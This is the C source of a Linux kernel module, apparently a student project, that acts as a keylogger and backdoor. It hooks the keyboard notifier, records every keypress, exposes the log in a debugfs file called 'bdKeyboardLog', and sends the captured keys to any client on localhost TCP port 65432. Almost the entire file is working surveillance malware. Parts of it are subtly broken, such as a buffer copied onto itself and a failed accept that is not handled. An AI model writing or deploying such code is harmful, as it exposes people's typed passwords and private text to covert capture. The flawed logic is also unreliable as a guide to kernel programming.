#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

// Keyboard logger libraries
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

// Server socket libraries
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/nsproxy.h>

#define SERVER_PORT 65432

// Keyboard logger code
#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12			 /* Encoded 'keycode shift' chunk length */

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, // 0-3
	{"3", "#"},
	{"4", "$"},
	{"5", "%"},
	{"6", "^"}, // 4-7
	{"7", "&"},
	{"8", "*"},
	{"9", "("},
	{"0", ")"}, // 8-11
	{"-", "_"},
	{"=", "+"},
	{"_BACKSPACE_", "_BACKSPACE_"}, // 12-14
	{"_TAB_", "_TAB_"},
	{"q", "Q"},
	{"w", "W"},
	{"e", "E"},
	{"r", "R"},
	{"t", "T"},
	{"y", "Y"},
	{"u", "U"},
	{"i", "I"}, // 20-23
	{"o", "O"},
	{"p", "P"},
	{"[", "{"},
	{"]", "}"}, // 24-27
	{"\n", "\n"},
	{"_LCTRL_", "_LCTRL_"},
	{"a", "A"},
	{"s", "S"}, // 28-31
	{"d", "D"},
	{"f", "F"},
	{"g", "G"},
	{"h", "H"}, // 32-35
	{"j", "J"},
	{"k", "K"},
	{"l", "L"},
	{";", ":"}, // 36-39
	{"'", "\""},
	{"`", "~"},
	{"_LSHIFT_", "_LSHIFT_"},
	{"\\", "|"}, // 40-43
	{"z", "Z"},
	{"x", "X"},
	{"c", "C"},
	{"v", "V"}, // 44-47
	{"b", "B"},
	{"n", "N"},
	{"m", "M"},
	{",", "<"}, // 48-51
	{".", ">"},
	{"/", "?"},
	{"_RSHIFT_", "_RSHIFT_"},
	{"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"},
	{" ", " "},
	{"_CAPS_", "_CAPS_"},
	{"F1", "F1"},
	{"F2", "F2"},
	{"F3", "F3"},
	{"F4", "F4"},
	{"F5", "F5"}, // 60-63
	{"F6", "F6"},
	{"F7", "F7"},
	{"F8", "F8"},
	{"F9", "F9"}, // 64-67
	{"F10", "F10"},
	{"_NUM_", "_NUM_"},
	{"_SCROLL_", "_SCROLL_"}, // 68-70
	{"_KPD7_", "_HOME_"},
	{"_KPD8_", "_UP_"},
	{"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"},
	{"_KPD4_", "_LEFT_"},
	{"_KPD5_", "_KPD5_"}, // 74-76
	{"_KPD6_", "_RIGHT_"},
	{"+", "+"},
	{"_KPD1_", "_END_"}, // 77-79
	{"_KPD2_", "_DOWN_"},
	{"_KPD3_", "_PGDN"},
	{"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"},
	{"_SYSRQ_", "_SYSRQ_"},
	{"\0", "\0"}, // 83-85
	{"\0", "\0"},
	{"F11", "F11"},
	{"F12", "F12"},
	{"\0", "\0"}, // 86-89
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"_KPENTER_", "_KPENTER_"},
	{"_RCTRL_", "_RCTRL_"},
	{"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"},
	{"_RALT_", "_RALT_"},
	{"\0", "\0"}, // 99-101
	{"_HOME_", "_HOME_"},
	{"_UP_", "_UP_"},
	{"_PGUP_", "_PGUP_"}, // 102-104
	{"_LEFT_", "_LEFT_"},
	{"_RIGHT_", "_RIGHT_"},
	{"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"},
	{"_PGDN", "_PGDN"},
	{"_INS_", "_INS_"}, // 108-110
	{"_DEL_", "_DEL_"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"}, // 111-114
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},			// 115-118
	{"_PAUSE_", "_PAUSE_"}, // 119
};

// Variables related to file handling
static struct dentry *file;
static struct dentry *subdir;

static char keybuf[BUF_LEN];
static size_t buf_pos;

static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keybuf, buf_pos);
}

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

// end of file related variables

int keyboard_callback(struct notifier_block *nblock, long unsigned int code, void *_param);
static int __init keyboard_module_init(void);
static void __exit keyboard_module_exit(void);
void keycode_to_string(int keycode, int shift_mask, char *buf);

static struct notifier_block my_notifier_block = {
	.notifier_call = keyboard_callback,
};

int keyboard_callback(struct notifier_block *nblock, long unsigned int code, void *_param)
{
	struct keyboard_notifier_param *param = _param; // casting the parameter
	size_t len;
	// keybuf[CHUNK_LEN] = {0};

	if (!param->down)
	{
		return NOTIFY_OK;
	}
	else
	{
		keycode_to_string(param->value, param->shift, keybuf);
		len = strlen(keybuf);
		if (len < 1) /* Unmapped keycode */
			return NOTIFY_OK;

		/* Reset key string buffer position if exhausted */
		if ((buf_pos + len) >= BUF_LEN)
			buf_pos = 0;

		/* Copy readable key to key string buffer */
		strncpy(keybuf + buf_pos, keybuf, len);
		buf_pos += len;

		len = strlen(keybuf);
		if (len < 1)
			return NOTIFY_OK; // isso ocorre e o keycode nao pode ser mapeado ao padrao US

		printk(KERN_INFO "Key pressed: %s\n", keybuf);
	}

	return NOTIFY_OK;
}

static int __init keyboard_module_init(void)
{

	register_keyboard_notifier(&my_notifier_block);

	subdir = debugfs_create_dir("backdoorSO", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("bdKeyboardLog", 0400, subdir, NULL, &keys_fops);
	if (!file)
	{
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	printk(KERN_INFO "Keyboard module initialized\n");
	return 0;
}

static void __exit keyboard_module_exit(void)
{
	unregister_keyboard_notifier(&my_notifier_block);
	debugfs_remove_recursive(subdir);
	printk(KERN_INFO "Keyboard module exited\n");
}

/**
 * keycode_to_string - convert keycode to readable string and save in buffer
 *
 * @keycode: keycode generated by the kernel on keypress
 * @shift_mask: Shift key pressed or not
 * @buf: buffer to store readable string
 * @type: log pattern
 */
void keycode_to_string(int keycode, int shift_mask, char *buf)
{

	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
	{
		const char *us_key = (shift_mask == 1)
								 ? us_keymap[keycode][1]
								 : us_keymap[keycode][0];
		snprintf(buf, CHUNK_LEN, "%s", us_key);
	}
}

// end of keyboard logger code

// Server socket code
struct task_struct *listen_thread;
struct socket *listen_sock;

static int listen_thread_func(void *data)
{
	struct socket *new_sock;
	struct sockaddr_in client_addr;
	int ret;
	int i = 0;

	// declare message
	char buffer[1024];
	struct msghdr msg;
	struct kvec vec;
	int len;

	// setup fields of vec and msg
	msg.msg_flags = 0;
	msg.msg_name = &client_addr;
	msg.msg_namelen = sizeof(client_addr);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;

	while (!kthread_should_stop())
	{

		// Accept a new connection
		ret = kernel_accept(listen_sock, &new_sock, O_NONBLOCK);
		if (ret < 0)
		{
			if (ret == -EAGAIN)
				continue;
			else
				pr_err("Failed to accept connection\n");
		}

		// Read and send data
		while (!kthread_should_stop())
		{
			vec.iov_base = buffer;
			vec.iov_len = sizeof(buffer);
			len = kernel_recvmsg(new_sock, &msg, &vec, sizeof(buffer), vec.iov_len, msg.msg_flags);

			// Break if no more data or error occurred
			if (len <= 0)
				break;

			/*buffer[0] = 'A';
			buffer[1] = 'D';
			buffer[2] = 'D';
			buffer[3] = (char)i;*/

			// Send data back
			vec.iov_base = keybuf;
			vec.iov_len = sizeof(char) * buf_pos;
			kernel_sendmsg(new_sock, &msg, &vec, buf_pos, sizeof(char) * buf_pos);
			i++;
		}

		// Close the new socket
		sock_release(new_sock);
	}

	return 0;
}

static int __init server_module_init(void)
{
	struct sockaddr_in addr;
	int ret;

	// Create a socket
	ret = sock_create_kern(current->nsproxy->net_ns, AF_INET, SOCK_STREAM, 0, &listen_sock);
	if (ret < 0)
	{
		pr_err("Failed to create socket\n");
		return ret;
	}

	// Bind the socket to a local address
	memset(&addr, 0, sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SERVER_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Listen on localhost

	ret = listen_sock->ops->bind(listen_sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
	if (ret < 0)
	{
		pr_err("Failed to bind socket\n");
		sock_release(listen_sock);
		return ret;
	}

	// Start listening for connections
	ret = listen_sock->ops->listen(listen_sock, 1);
	if (ret < 0)
	{
		pr_err("Failed to listen on socket\n");
		sock_release(listen_sock);
		return ret;
	}

	// Create a dedicated thread for handling connections
	listen_thread = kthread_run(listen_thread_func, NULL, "listen_thread");
	if (IS_ERR(listen_thread))
	{
		pr_err("Failed to create listen_thread\n");
		sock_release(listen_sock);
		return PTR_ERR(listen_thread);
	}

	return 0;
}

static void __exit server_module_exit(void)
{
	// Stop the listen_thread
	if (listen_thread)
		kthread_stop(listen_thread);

	// Release the socket
	if (listen_sock)
		sock_release(listen_sock);

	pr_info("Exiting module\n");
}

// Kernel module initializing function

static int __init kernel_module_init(void)
{
	keyboard_module_init();
	server_module_init();
	return 0;
}

static void __exit kernel_module_exit(void)
{
	server_module_exit();
	keyboard_module_exit();
}

module_init(kernel_module_init);
module_exit(kernel_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("NicholasEnzoRafael");
MODULE_DESCRIPTION("Kernel Module");